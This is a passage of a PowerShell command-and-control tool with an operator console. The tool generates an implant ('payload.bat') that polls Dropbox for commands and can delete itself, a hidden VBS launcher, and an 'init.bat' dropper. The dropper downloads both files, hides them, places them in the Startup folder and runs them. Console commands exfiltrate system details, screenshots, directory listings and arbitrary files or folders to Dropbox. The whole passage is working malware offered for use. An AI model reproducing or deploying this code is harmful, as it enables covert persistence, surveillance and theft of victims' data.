                `$shouldSelfDestruct = `$true
                Write-Host "Targeted self-destruct command received for this computer" -ForegroundColor DarkYellow
            } else {
                Write-Host "Self-destruct command received, but targeted for: `$targetComputer" -ForegroundColor DarkYellow
                `$shouldSelfDestruct = `$false
            }
        } else {
            `$shouldSelfDestruct = `$true
            Write-Host "General self-destruct command received" -ForegroundColor DarkYellow
        }
        if (`$shouldSelfDestruct) {
            Write-Host "Initiating self-destruct sequence..." -ForegroundColor DarkYellow
            if (`$wrapperRemovalCommand) {
                Write-Host "Removing wrapper..." -ForegroundColor DarkYellow
                try {
                    Invoke-Expression `$wrapperRemovalCommand
                    Write-Host "Wrapper removed successfully" -ForegroundColor DarkGreen
                } catch {
                    Write-Host "Failed to remove wrapper: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
                }
            }
            Delete-File -accessToken `$accessToken -filePath "/selfdestruct.txt" | Out-Null
            `$scriptPath = `$MyInvocation.MyCommand.Path
            if (-not `$scriptPath) {
                `$scriptPath = `$env:SCRIPT_PATH
                if (-not `$scriptPath) {
                    Write-Host "Error: Script path not found." -ForegroundColor DarkRed
                    return
                }
            }
            `$deleteCommand = 'cmd /c "timeout /t 3 /nobreak > Nul & del /f /q "' + `$scriptPath + '"'
            Start-Process -FilePath "cmd.exe" -ArgumentList "/c", `$deleteCommand -WindowStyle Hidden
            exit
        }
    }
}

while (`$true) {
    if (-not `$accessToken -or -not (Test-AccessToken -accessToken `$accessToken)) {
        Write-Host "Acquiring new access token..." -ForegroundColor DarkYellow
        `$accessToken = Get-AccessToken
        if (-not `$accessToken) {
            Write-Host "Failed to obtain access token, retrying in 30 seconds..." -ForegroundColor DarkRed
            Start-Sleep 30
            continue
        }
        Write-Host "Access token acquired successfully" -ForegroundColor DarkGreen
        if (`$firstRun) {
            Update-LastPing -accessToken `$accessToken | Out-Null
            `$startupMessage = "# STARTUP ON `$startupTime"
            Append-ToLog -accessToken `$accessToken -message `$startupMessage | Out-Null
            Write-Host "Startup logged: `$startupMessage" -ForegroundColor White
            `$firstRun = `$false
        }
    }
    try {
        Check-SelfDestruct -accessToken `$accessToken
        `$allFiles = Check-DropboxFiles -accessToken `$accessToken -pattern "cmd_*.txt"
        if (`$allFiles) {
            `$lowestNumberFile = `$null
            `$lowestNumber = [int]::MaxValue
            foreach (`$file in `$allFiles) {
                if (`$file.name -match "cmd_(\d+)\.txt") {
                    `$num = [int]`$matches[1]
                    if (`$num -lt `$lowestNumber) {
                        `$lowestNumber = `$num
                        `$lowestNumberFile = `$file.name
                    }
                }
            }
            if (`$lowestNumberFile) {
                Write-Host "Found command `$lowestNumberFile, processing..." -ForegroundColor DarkGreen
                `$success = Process-Command -accessToken `$accessToken -fileName `$lowestNumberFile
                if (-not `$success) {
                    Write-Host "Command processing failed" -ForegroundColor DarkYellow
                    `$accessToken = `$null
                }
            } else {
                Write-Host "No command found, checking every `$responseTime seconds..." -ForegroundColor White
            }
        } else {
            Write-Host "No command found, checking every `$responseTime seconds..." -ForegroundColor White
        }
        `$currentTime = Get-Date
        if ((`$currentTime - `$lastPingTime).TotalSeconds -ge `$pingDelay) {
            `$pingSuccess = Update-LastPing -accessToken `$accessToken
            if (-not `$pingSuccess) {
                Write-Host "Ping update failed" -ForegroundColor DarkYellow
                `$accessToken = `$null
            } else {
                `$lastPingTime = `$currentTime
            }
        }
    }
    catch {
        Write-Host "Error in main loop: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        `$accessToken = `$null
    }
    Start-Sleep `$responseTime
}
"@

    Set-Content -Path "payload.bat" -Value $batchContent -Encoding ASCII
    Write-Host "Deployment script created as 'payload.bat'" -ForegroundColor DarkGreen
    Write-Host ""
}

function Wrap-Script {
    param([string]$FilePath = $ProfileFile)

    $payloadPath = Read-Host "Payload path: APPDATA\"
    $payloadPath = $payloadPath.Trim('"')
    $escapedPath = $payloadPath -replace '"', '""'

    Write-Host ""

    $fileContent = @'
Dim shell, path
Set shell = CreateObject("WScript.Shell")
path = shell.ExpandEnvironmentStrings("%APPDATA%") & "\{0}"
shell.Run """" & path & """", 0, False
'@ -f $escapedPath

    Set-Content -Path "wrapper.vbs" -Value $fileContent -Encoding ASCII
    Write-Host "Wrap script created as 'wrapper.vbs'" -ForegroundColor DarkGreen
    Write-Host ""
}

function Init-Script {
    $payloadLink = Read-Host "Payload link"
    $wrapperLink = Read-Host "Wrapper link"

    $payloadPath = Read-Host "Payload path"
    $wrapperName = Read-Host "Wrapper name"

    $psCommand = "`$s=[Environment]::GetFolderPath('Startup'); `$a=[Environment]::GetFolderPath('ApplicationData'); Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$PID} | Stop-Process -Force; `$b=(Join-Path `$a '$payloadPath'); `$v=(Join-Path `$s '$wrapperName'); Remove-Item `$b,`$v -Force -ErrorAction SilentlyContinue; iwr '$payloadLink' -OutFile `$b; attrib +h `$b; iwr '$wrapperLink' -OutFile `$v; attrib +h `$v; & `$v; exit"

    $batchContent = "powershell -NoProfile -Command `"$psCommand`""

    Set-Content -Path "init.bat" -Value $batchContent -Encoding ASCII

    Write-Host "Init script created as 'init.bat'" -ForegroundColor DarkGreen
}

function Clear-Screen {
    try {
        Clear-Host
    } catch {
        Write-Host "`n" * 50
    }
}

function Cmd-Fetch {
    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return 
    }

    $command = @'
# CMD-FETCH
$computerName = $env:COMPUTERNAME
$username = $env:USERNAME
$ipv4Addresses = @()
$ipv4Adapters = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { 
$_.IPAddress -ne '127.0.0.1' -and $_.AddressState -eq 'Preferred'
}
foreach ($adapter in $ipv4Adapters) {
$ipv4Addresses += $adapter.IPAddress
}
$ipv4 = if ($ipv4Addresses.Count -gt 0) { $ipv4Addresses -join ', ' } else { 'No IPv4 address found' }
$ipv6Addresses = @()
$ipv6Adapters = Get-NetIPAddress -AddressFamily IPv6 | Where-Object { 
$_.IPAddress -ne '::1' -and $_.AddressState -eq 'Preferred'
}
foreach ($adapter in $ipv6Adapters) {
$ipv6Addresses += $adapter.IPAddress
}
$ipv6 = if ($ipv6Addresses.Count -gt 0) { $ipv6Addresses -join ', ' } else { 'No IPv6 address found' }
$os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
$memory = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
$cpu = (Get-WmiObject -Class Win32_Processor).Name
$gpus = (Get-WmiObject -Class Win32_VideoController).Name
$gpu = if ($gpus.Count -gt 0) { $gpus -join ', ' } else { 'No GPU found' }
$output = @"
Computer Name: $computerName
Username: $username
IPv4 Addresses: $ipv4
IPv6 Addresses: $ipv6
Operating System: $os
Total Memory: $memory GB
CPU: $cpu
GPU: $gpu
"@
$bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
$fileName = "fetch_$computerName.txt"
$uri = "https://content.dropboxapi.com/2/files/upload"
$apiArg = @{path = "/$fileName"; mode = "overwrite"; autorename = $true; mute = $true} | ConvertTo-Json -Compress
$headers = @{Authorization = "Bearer $accessToken"; "Dropbox-API-Arg" = $apiArg; "Content-Type" = "application/octet-stream"}
Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $bytes
'@

    Send-Command -CommandString $command
}

function Cmd-Screenshot {
    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return 
    }

    $command = @"
# CMD-SCREENSHOT
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
`$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
`$bitmap = New-Object System.Drawing.Bitmap `$screen.Width, `$screen.Height
`$graphics = [System.Drawing.Graphics]::FromImage(`$bitmap)
`$graphics.CopyFromScreen(`$screen.X, `$screen.Y, 0, 0, `$bitmap.Size)
`$graphics.Dispose()
`$memoryStream = New-Object System.IO.MemoryStream
`$bitmap.Save(`$memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
`$screenshotBytes = `$memoryStream.ToArray()
`$memoryStream.Dispose()
`$bitmap.Dispose()
`$computerName = `$env:COMPUTERNAME
`$timeStamp = Get-Date -Format 'yyyyMMdd_HHmmss'
`$fileName = "screenshot_`${computerName}_`${timeStamp}.png"
`$uri = "https://content.dropboxapi.com/2/files/upload"
`$apiArg = @{path = "/`$fileName"; mode = "overwrite"; autorename = `$true; mute = `$true} | ConvertTo-Json -Compress
`$headers = @{Authorization = "Bearer `$accessToken"; "Dropbox-API-Arg" = `$apiArg; "Content-Type" = "application/octet-stream"}
Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$screenshotBytes
"@

    Send-Command -CommandString $command
}

function Cmd-Tree {
    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return 
    }

    Write-Host " 1. C:" -ForegroundColor White
    Write-Host " 2. User" -ForegroundColor White
    Write-Host " 3. Custom" -ForegroundColor White
    Write-Host ""

    $choice = Read-Host "Scan"
    Write-Host ""

    $path = ""
    switch ($choice) {
        "1" { $path = "C:\" }
        "2" { $path = "`$env:USERPROFILE" }
        default {
            $customPath = Read-Host "Path"
            $path = "$customPath" 
        }
    }

    $command = @"
# CMD-TREE
function Get-TreeStructure {
param(`$Path, `$IndentLevel = 0)
`$output = @()
`$items = Get-ChildItem -Path `$Path -Force -ErrorAction "SilentlyContinue" | Sort-Object Name
foreach (`$item in `$items) {
`$indent = "  " * `$IndentLevel
if (`$item.PSIsContainer) {
`$output += "`$indent[`$(`$item.Name)]/"
`$output += Get-TreeStructure -Path `$item.FullName -IndentLevel (`$IndentLevel + 1)
} else {
`$output += "`$indent`$(`$item.Name) (`$(`$item.Length) bytes)"
}
}
return `$output
}
`$treeOutput = @("Tree for: $path", "")
`$treeOutput += Get-TreeStructure -Path "$path"
`$treeText = `$treeOutput -join "`r`n"
`$computerName = `$env:COMPUTERNAME
`$timeStamp = Get-Date -Format 'yyyyMMdd_HHmmss'
`$fileName = "tree_`${computerName}_`${timeStamp}.txt"
`$uri = "https://content.dropboxapi.com/2/files/upload"
`$apiArg = @{path = "/`$fileName"; mode = "overwrite"; autorename = `$true; mute = `$true} | ConvertTo-Json -Compress
`$headers = @{Authorization = "Bearer `$accessToken"; "Dropbox-API-Arg" = `$apiArg; "Content-Type" = "application/octet-stream"}
`$bytes = [System.Text.Encoding]::UTF8.GetBytes(`$treeText)
Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$bytes
"@

    Send-Command -CommandString $command
}

function Cmd-Download {
    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return 
    }

    Write-Host " 1. User" -ForegroundColor White
    Write-Host " 2. AppData (Roaming)" -ForegroundColor White
    Write-Host " 3. AppData (Local)" -ForegroundColor White
    Write-Host " 4. Custom" -ForegroundColor White
    Write-Host ""

    $choice = Read-Host "Starting path"
    Write-Host ""

    $filePath = ""

    switch ($choice) {
        "1" {
            $fileName = Read-Host "USERPROFILE\"
            $filePath = "`$env:USERPROFILE\$fileName"
        }
        "2" {
            $fileName = Read-Host "APPDATA\"
            $filePath = "`$env:APPDATA\$fileName"
        }
        "3" {
            $fileName = Read-Host "LOCALAPPDATA\"
            $filePath = "`$env:LOCALAPPDATA\$fileName"
        }
        default {
            $filePath = Read-Host "Path"
        }
    }
    $filePath = $filePath -replace '"', ''

    $command = @"
# CMD-DOWNLOAD
`$filePath = "$filePath"
if (Test-Path `$filePath) {
if ((Get-Item `$filePath) -is [System.IO.DirectoryInfo]) {
`$folderName = (Get-Item `$filePath).Name
`$zipFileName = "`$folderName_`$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
`$zipPath = "`$env:TEMP\`$zipFileName"
Compress-Archive -Path "`$filePath\*" -DestinationPath `$zipPath -CompressionLevel Optimal
`$fileContent = [System.IO.File]::ReadAllBytes(`$zipPath)
`$uri = "https://content.dropboxapi.com/2/files/upload"
`$apiArg = @{path = "/`$zipFileName"; mode = "overwrite"; autorename = `$true; mute = `$true} | ConvertTo-Json -Compress
`$headers = @{Authorization = "Bearer `$accessToken"; "Dropbox-API-Arg" = `$apiArg; "Content-Type" = "application/octet-stream"}
Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$fileContent
Remove-Item `$zipPath -Force
"Folder uploaded successfully as: `$zipFileName"
} else {
`$fileName = [System.IO.Path]::GetFileName(`$filePath)
`$fileContent = [System.IO.File]::ReadAllBytes(`$filePath)
`$uri = "https://content.dropboxapi.com/2/files/upload"
`$apiArg = @{path = "/`$fileName"; mode = "overwrite"; autorename = `$true; mute = `$true} | ConvertTo-Json -Compress
`$headers = @{Authorization = "Bearer `$accessToken"; "Dropbox-API-Arg" = `$apiArg; "Content-Type" = "application/octet-stream"}
Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$fileContent
"File uploaded successfully: `$fileName"
}
} else {
    "Path not found: `$filePath"
}
"@

    Send-Command -CommandString $command
}

$exitRequested = $false

Write-Host '    e Y8b  88P''888''Y88 888 88e ' -ForegroundColor DarkBlue
Write-Host '   d8b Y8b P''  888  ''Y 888 888D' -ForegroundColor DarkBlue
Write-Host '  d888b Y8b    888     888 88"   ' -ForegroundColor DarkBlue
Write-Host ' 6E65787371b   888     888 b,    ' -ForegroundColor DarkBlue
Write-Host 'd8888888b Y8b  888     888 88b,  ' -ForegroundColor DarkBlue
Write-Host ""

while (-not $exitRequested) {
    if ($CurrentProfile) {
        Write-Host -NoNewline "#$($CurrentProfile.Name) > " -ForegroundColor DarkBlue
    }
    else {
        Write-Host -NoNewline "# > " -ForegroundColor DarkBlue
    }

    $InputLine = Read-Host
    $InputParts = $InputLine.Split(" ", 2)
    $Command = $InputParts[0].ToLower()
    $Args = if ($InputParts.Count -gt 1) { $InputParts[1] } else { "" }

    switch -regex ($Command) {
        "^(profile-add|p-add|profile-new|p-new)$" {
            Profile-New 
        }
        "^(profile-set|p-set|p-s|p)$" {
            $Selected = Profile-Set
            if ($Selected) {
                $CurrentProfile = $Selected
                Write-Host "Profile set to: $($CurrentProfile.Name)" -ForegroundColor DarkGreen
            }
        }
        "^(profile-del|p-del|profile-remove|p-remove|p-rem)$" {
            Profile-Del
        }
        "^(profile-list|p-list|p-l)$" {
            Profile-List
        }
        "^(profile-details|p-details|p-d)$" {
            Profile-Details
        }
        "^(cmd|c)$" {
            Send-Command
        }
        "^(cmd-list|c-list|c-l)$" {
            List-Commands
        }
        "^(cmd-get|c-get|c-g)$" {
            Get-Command
        }
        "^(cmd-del|c-del|c-d|cmd-rem|cmd-r|c-r)$" {
            Delete-Command
        }
        "^(repo|repository|rep|clone)$" {
            Repo-Download
        }
        "^(fetch|info)$" {
            Cmd-Fetch
        }
        "^(screenshot|ss)$" {
            Cmd-Screenshot
        }
        "^(tree)$" {
            Cmd-Tree
        }
        "^(download|dwn|get)$" {
            Cmd-Download
        }
        "^selfdestruct$" {
            $targetComputer = $null
            if ($Args) {
                $targetComputer = $Args -replace '^/+', ''
            }
            Send-SelfDestruct -TargetComputer $targetComputer
        }
        "^(deploy|d|payload)$" {
            Deploy-Script
        }
        "^wrap$" {
            Wrap-Script
        }
        "^(init|i)$" {
            Init-Script
        }
        "^(cls|clear)$" {
            Clear-Screen
        }
        "^(help|h)$" {
            Show-Help
        }
        "^exit$" { 
            $exitRequested = $true
        }
        "^$" { }
        default {
            Write-Host "Invalid command: $Command" -ForegroundColor DarkRed
            Write-Host "Type 'help' for a list of available commands" -ForegroundColor DarkRed
        }
    }

}